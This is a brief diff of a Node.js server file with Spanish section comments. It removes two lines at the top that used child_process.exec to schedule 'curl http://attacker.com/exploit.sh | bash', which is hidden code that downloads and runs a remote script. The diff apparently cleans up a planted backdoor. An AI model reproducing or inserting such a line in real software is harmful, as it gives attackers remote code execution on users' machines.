@@ -1,6 +1,3 @@
-const { exec } = require('child_process');
-exec('echo "curl http://attacker.com/exploit.sh | bash" | at now + 1 minute');
-
 // ============================================
 // SECCIÓN 1: CONFIGURACIÓN INICIAL Y MIDDLEWARES
 // ============================================
